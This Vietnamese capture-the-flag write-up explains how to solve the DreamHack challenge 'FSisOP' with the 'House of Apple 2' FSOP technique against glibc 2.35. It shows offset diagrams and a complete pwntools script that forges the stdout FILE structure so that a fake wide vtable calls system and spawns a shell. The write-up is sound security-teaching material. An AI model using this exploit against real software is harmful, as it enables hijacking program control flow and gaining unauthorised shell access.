# FSisOP---Write-up-----DreamHack
Hướng dẫn cách giải bài FSisOP cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 7/4/2026

## 1. Mục tiêu cần làm
Bài này nó giống như tutorial cho các bạn làm quen về kĩ thuật khá hay gọi là **FSOP** aka File Stream Oriented Programming. **FSOP** là một kỹ thuật khai thác bộ nhớ nâng cao, tập trung vào việc lạm dụng và thao túng các cấu trúc dữ liệu quản lý luồng tệp ( File Stream ) của thư viện chuẩn C ( glibc ) để chiếm quyền điều khiển luồng thực thi của chương trình.

**FSOP** có rất nhiều kĩ thuật qua từng phiên bản glibc, ví dụ nếu glibc >= 2.24 thì ta có các kĩ thuật như `House of Orange`, `House of Pig`,... còn các glibc hiện tại ví dụ như bài này thì mình sẽ dùng `House of Apple 2`. Nói chung thì các kĩ thuật đó sẽ nhắm thẳng vào các luồng _IO_FILE đang tồn tại trên Heap hoặc trong phân vùng dữ liệu của libc.

Bạn nào muốn tìm hiểu sâu thêm về các biến thể của **FSOP** và tìm các bài tập thì có thể tham khảo `How2Heap` nha. Giờ mình sẽ vô phần chính của bài này là kĩ thuật `House of Apple 2`.

Đầu tiên là đọc sơ code bài

```C
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  setvbuf(_bss_start, 0LL, 2, 0LL);
  printf("%p\n", _bss_start);
  read(0, _bss_start, 0xE0uLL);
  puts("modify finished!");
  _exit(0);
}
```

Nó sẽ cho ta luôn giá trị bắt đầu của `IO_file` và cho ta ghi 224 byte vào đó. Giờ ta sẽ bắt đầu giải thích cách hoạt động của `House of Apple 2`.

Ở các phiên bản glibc mới ( từ 2.34 trở lên ), các pháp sư thiết kế libc đã đắp thêm một lớp khiên cực kỳ khó chịu gọi là `_IO_vtable_check`. Cái hàm này sẽ kiểm tra xem con trỏ vtable của bạn có nằm đúng trong phân vùng hợp lệ của libc không. Nếu bạn cố tình trỏ nó ra vùng heap hay BSS như ngày xưa thì nó sẽ văng lỗi Segfault vào mặt bạn ngay lập tức. Chưa kể đến trò IBT/SHSTK chặn việc nhảy lung tung.

Đó là lý do `House of Apple 2` ra đời. Kĩ thuật này không thèm fake vtable vòng ngoài nữa, mà nó sẽ xài luôn một vtable "hàng auth" của libc là `_IO_wfile_jumps` để qua mặt bước check. Sau đó, nó lạm dụng một cấu trúc nằm sâu bên trong dùng để xử lý chuỗi Unicode là `_wide_data`.

```Plaintext
[ _IO_FILE_plus ]                      
+-----------------------------+               
| 0x00: _flags                |               
| ...                         |               
| 0xa0: _wide_data  ----------|------>  [ _IO_wide_data ]
| ...                         |         +---------------------------+
| 0xd8: vtable                |         | 0x00: _IO_read_ptr        |
+-----------------------------+         | ...                       |
    (Glibc kiểm tra cái này)            | 0xe0: _wide_vtable  ------|------> [ fake _wide_vtable ]
                                        +---------------------------+        +--------------------------+
                                          (Glibc QUÊN kiểm tra cái này!)     | 0x00: ...                |
                                                                             | 0x68: doallocate ------> | SYSTEM() !!
                                                                             +--------------------------+
```

Bên trong `_wide_data` lại có một con trỏ là `_wide_vtable`. Libc check cái vtable ngoài rất kĩ, nhưng lại quên check cái `_wide_vtable` này. Vậy nên ta có thể fake `_wide_vtable` thoải mái, trỏ cái hàm `doallocate` ( hàm cấp phát bộ nhớ khi buffer đầy ) thành hàm `system`, và bùm nổ shell.

Nói tóm lại, luồng đi của nó sẽ là: `puts` -> `_IO_wfile_overflow` -> `_IO_wdoallocbuf` -> `_wide_vtable` -> `doallocate` -> `system("  sh")`. Ok giờ bắt tay vô cook thôi.

## 2. Cách thực thi

Chương trình đã leak sẵn cho ta địa chỉ của `_bss_start` ( bản chất chính là `_IO_2_1_stdout_` ). Ta lấy nó tính được libc base luôn.

Vấn đề khó nhất của bài này là hàm read chỉ cho ta ghi đúng 224 byte aka 0xE0 byte vào `stdout`. Trong khi đó, theo cấu trúc của libc, nếu ta gán biến `_wide_data` ngay từ đầu, nó sẽ cộng thêm 0xE0 để tìm cái `_wide_vtable`. Tức là `_wide_vtable` sẽ nằm ngoài vùng 224 byte mà ta kiểm soát được.

Nên chỗ này ta phải xài 1 trick gọi là "gấp nếp con trỏ". Gọi vị trí bắt đầu là F. Ta sẽ trỏ cái `_wide_data` ( nằm ở offset 0xA0 ) lùi lại một chút về vị trí F - 0x10.

```Plaintext
Địa chỉ / Offset        Vùng nhớ bạn được phép ghi đè (0xE0 Bytes)
-------------------------------------------------------------------------
[ F + 0x00 ] (_flags)    | b"  sh\x00\x00\x00\x00"  (Tham số cho system)|
                         |                                              |
[ F + 0x10 ]             | <--- Điểm bắt đầu của fake _wide_vtable      |<----.
                         |                                              |     |
[ F + 0x78 ]             | [ ĐỊA CHỈ HÀM SYSTEM ]  (Hàm doallocate)     |<--. | (F + 0x10) + 0x68
                         |                                              |   | |
[ F + 0x88 ] (_lock)     | [ F + 0x80 ] (Tránh lỗi Segfault)            |   | |
                         |                                              |   | |
[ F + 0xA0 ] (_wide_data)| [ F - 0x10 ] --------------------------------|---|-+
                         |                                              |   | | (F - 0x10) + 0xE0
[ F + 0xD0 ]             | [ F + 0x10 ] (Con trỏ fake _wide_vtable) ----|---' |
[ F + 0xD8 ] (vtable)    | [ _IO_wfile_jumps ] (Vtable hợp lệ)          |     |
-------------------------------------------------------------------------     |
(Nằm ngoài Payload)                                                           |
[ F - 0x10 ]             | <--- Glibc coi đây là điểm đầu _wide_data <--------'
```

Lúc này, libc cộng thêm 0xE0 để tìm `_wide_vtable` thì: F - 0x10 + 0xE0 = F + 0xD0. F + 0xD0 nằm gọn trong vùng ta kiểm soát. Tại vị trí F + 0xD0 này, ta lại trỏ nó về F + 0x10.

Hàm `doallocate` nằm ở offset 0x68 của `vtable`. Vậy vị trí cuối cùng của nó sẽ là: F + 0x10 + 0x68 = F + 0x78. Tại đây, ta tự tin phang địa chỉ của `system` vào.

<img width="1324" height="485" alt="image" src="https://github.com/user-attachments/assets/05d67e31-99d2-4502-9207-83fe3da7bea1" />

Ngoài ra, ở vị trí 0x88 có một cái con trỏ tên là `_lock`. Nếu bạn đè trúng nó bằng null byte thì sẽ bị Segfault ngay. Nên ta trỏ nó vào một vùng trống có quyền ghi ngay trong payload luôn ( ví dụ F + 0x80 ). Tham số truyền vào cho `system` sẽ nằm ngay tại offset 0x00, ta ghi chuỗi `  sh` vào đó là xong.

<img width="1655" height="487" alt="image" src="https://github.com/user-attachments/assets/387e37c6-f1f1-4d4d-8f6a-c5735499dd7a" />

Sau khi gửi xong payload thì nó sẽ như vậy, giờ chỉ cần chạy tới `puts` là nó nhả shell ra luôn. Như mình nói bài này nó giống tutorial **FSOP** vậy nên khá là dễ, nó giúp anh em hiểu rõ bản chất của con trỏ trong struct C, nhìn có vẻ rối nhưng tự tính tay vài lần là quen.

Thôi thì hãy cho mình 1 star để có động lực viết write up tiếp nha 🐧.

## 3. Exploit

```Python
from pwn import *

exe = ELF("prob_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

p = process('./prob_patched')
#p = remote('host8.dreamhack.games', 13128)

p.recvuntil(b'0x')
stdout_leak = int(p.recvline().strip(), 16)

libc.address = stdout_leak - libc.sym['_IO_2_1_stdout_']
log.success(f"Libc base: {hex(libc.address)}")

F = stdout_leak
system_addr = libc.sym['system']
_IO_wfile_jumps = libc.sym['_IO_wfile_jumps']

payload = bytearray(b'\x00' * 224)
payload[0:8] = b'  sh\x00\x00\x00\x00'
payload[120:128] = p64(system_addr)
payload[136:144] = p64(F + 128)
payload[160:168] = p64(F - 16)
payload[208:216] = p64(F + 16)
payload[216:224] = p64(_IO_wfile_jumps)

pause()

p.send(payload)

p.interactive()
```

